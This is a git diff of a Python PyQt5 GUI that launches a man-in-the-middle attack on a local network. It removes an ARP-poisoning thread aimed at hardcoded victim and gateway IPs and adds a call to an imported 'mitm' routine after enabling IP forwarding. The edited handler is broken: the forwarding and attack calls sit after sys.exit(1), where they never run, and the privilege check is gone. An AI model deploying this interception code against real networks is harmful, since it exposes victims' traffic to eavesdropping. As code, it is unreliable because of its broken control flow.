@@ -1,8 +1,7 @@
 import sys
 from os import geteuid
 from PyQt5.QtWidgets import QWidget, QPushButton, QApplication
-from util import *
-from arp_poison import *
+from mitm import *
 
 class Main(QWidget):
     
@@ -30,24 +29,18 @@ class Main(QWidget):
         self.show()
     
     def func1(self):
-        if not geteuid() == 0:
-            sysexit("sudo dummy")
         try:
-            print("Starting...")
-            A_IP = "192.168.0.22"
-            B_IP = "192.168.0.2"
             interface = "eth0"
-            A_MAC = get_mac(A_IP, interface)
-            B_MAC = get_mac(B_IP, interface)
-
-            poison_thread = threading.Thread(target=arp_poison, args=(A_IP, A_MAC, B_IP, B_MAC, interface))
-            poison_thread.daemon = True
-            poison_thread.start()
-        except IOError:
-            sysexit("Interface doesn't exist")
+            victimIP = "192.168.0.22"
+            gateIP = "192.168.0.2"
         except KeyboardInterrupt:
-            call(("iptables -t nat -F PREROUTING").split(' '))
-        print("\nStopping...")
+            print("\n[*] User Requested Shutdown")
+            print("[*] Exiting...")
+            sys.exit(1)
+ 
+            print("\n[*] Enabling IP Forwarding...\n")
+            os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+            mitm()
 
     def func2(self):
         print('2')
